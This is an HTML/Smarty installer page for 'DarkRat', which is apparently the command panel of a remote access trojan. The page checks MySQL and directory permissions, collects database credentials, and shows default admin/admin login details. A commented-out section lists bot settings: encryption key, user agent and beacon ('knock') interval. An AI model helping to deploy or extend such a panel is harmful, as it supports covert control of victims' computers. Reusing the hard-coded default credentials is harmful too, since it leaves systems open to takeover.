<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body { font-family: Arial;
    background: #27293d;
    color: white;
  width: 1000px;
  margin: 0 auto;
}

/* Style the tab */
.tab {
  overflow: hidden;
  border: 1px solid #ccc;
  background-color: #f1f1f1;
}

/* Style the buttons inside the tab */
.tab button {
  background-color: inherit;
  float: left;
  border: none;
  outline: none;
  cursor: pointer;
  padding: 14px 16px;
  transition: 0.3s;
  font-size: 17px;
}

/* Change background color of buttons on hover */
.tab button:hover {
  background-color: #ddd;
}

/* Create an active/current tablink class */
.tab button.active {
  background-color: #ccc;
}

/* Style the tab content */
.tabcontent {
  display: none;
  padding: 6px 12px;
  border: 1px solid #ccc;
  border-top: none;
}
</style>
</head>
<body>

<h2>DarkRat Installer </h2>
<p>What hackers do is figure out technology and experiment with it in ways many people never imagined. They also have a strong desire to share this information with others and to explain it to people whose only qualification may be the desire to learn.</p>


<div class="tab">
  <button class="tablinks" {if $finishing}{else} id="defaultOpen"{/if} onclick="openTab(event, 'Requirements')">Requirements</button>
  <button class="tablinks" onclick="openTab(event, 'Database')">Database</button>
  <button class="tablinks"  {if $finishing}id="defaultOpen" onclick="openTab(event, 'Finishing')" {/if} >Finishing</button>
</div>

<div id="Requirements" class="tabcontent">
 
    {if $return.mysql == "1"}
        MySql Installed
    {else}
        Please Install MYsql
    {/if}
    <hr>



    {foreach from=$return.writable item=dir}
        {$dir} is Writable <br/>
    {/foreach}
    {foreach from=$return.dontwritable item=dir}
         Please make {$dir} Writable <br/>
    {/foreach}

</div>

<div id="Database" class="tabcontent">
  <h3>Create MySql</h3>

  <form method="POST">Create MySql
    <label>MySQL Username</label>
    <input name="mysqlusername">
    <br>
    <label>MySQL Password</label>
    <input name="mysqlpassword">
    <hr>
    <label>MySQL Database</label>
    <input name="databaseName"> (Make sure this is Existing)

    <hr>
    <input value="Install" type="submit">
  </form>



</div>

<div id="Finishing" class="tabcontent">

<!--
  <label>Encryption Key</label>
    <input name="encryptionkey">
  <label>User Agent</label>
    <input name="useragent">
  <label>Knock Time</label>
    <input name="requestinterval">
    <input type="submit">

  -->
  <p>
    Login:<br>
    admin<br>
    admin
  </p>
<hr>
  <a href="/login" style="color:white;">Login</a>


</div>

<script>
function openTab(evt, cityName) {
  var i, tabcontent, tablinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" active", "");
  }
  document.getElementById(cityName).style.display = "block";
  evt.currentTarget.className += " active";
}
document.getElementById("defaultOpen").click();
</script>
   
</body>
</html> 
